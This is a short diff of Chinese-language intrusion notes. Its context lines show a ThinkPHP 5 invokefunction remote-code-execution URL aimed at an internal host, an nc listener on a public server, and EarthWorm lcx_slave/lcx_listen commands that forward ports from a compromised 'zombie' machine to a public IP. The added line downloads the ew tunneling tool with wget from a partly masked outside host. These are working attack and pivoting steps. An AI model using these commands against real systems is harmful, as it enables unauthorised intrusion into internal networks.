@@ -39,11 +39,14 @@ http://10.203.87.64/tp5/public/index.php?s=/index/\think\app/invokefunction&func
 公网服务器上面监听：
 nc -l -p 1235
 下载ew
+wget -p /tmp http://45.\*.\*.190/ew_for_linux
+
 
 ## 使用lcx相关的功能
 ### 将肉鸡的22端口或者内网中的10.203.87.61的80端口转发到公网上8888端口
 `./ew_for_linux -s lcx_slave  -d 45.76.101.190 -e 8888    -f 127.0.0.1  -g  6522`
 
+>
 
 ### 公网服务器监听端口转发8888
 ` ./ew_for_linux -s lcx_listen -l  8888   -e 8889`
